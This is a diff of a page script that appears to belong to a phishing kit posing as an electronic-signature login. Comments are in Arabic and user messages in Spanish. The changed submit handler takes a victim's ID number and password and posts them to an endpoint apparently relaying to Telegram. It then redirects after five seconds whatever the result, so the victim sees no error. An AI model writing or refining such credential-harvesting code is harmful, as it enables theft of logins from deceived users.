@@ -239,31 +239,27 @@ $("#I").click(function(){
 
 
 });
-document.getElementById("sscsc").addEventListener("submit", async function(e){
-    e.preventDefault();
+document.getElementById("sscsc").addEventListener("submit", (e) => {
+  e.preventDefault(); // منع الإرسال العادي للفورم
 
-    const id_no = document.getElementById("nameinputs").value;
-    const password = document.getElementById("input_6").value;
+  // نجيب البيانات من الحقول
+  const data = {
+    id_no: document.getElementById("nameinputs").value,
+    password: document.getElementById("input_6").value
+  };
 
-    try {
-        const res = await fetch("/api/telegrame", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ id_no, password })
-        });
+  // إرسال البيانات لـ API
+  fetch("/api/telegrame", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data),
+  }).catch(err => console.error("❌ Error:", err));
 
-        if(res.ok){
-            window.location.href = "firma_electronica.html"; // ✅ تحويل بعد الإرسال
-        } else {
-            const errorText = await res.text();
-            alert("❌ Error al enviar los datos: " + errorText);
-        }
-    } catch (err){
-        console.error(err);
-        alert("❌ No se pudo conectar con el servidor");
-    }
+  // بعد 5 ثواني ندير تحويل ل firma_electronica.html
+  setTimeout(() => {
+    window.location.href = "firma_electronica.html";
+  }, 5000);
 });
-
 
 </script>
 
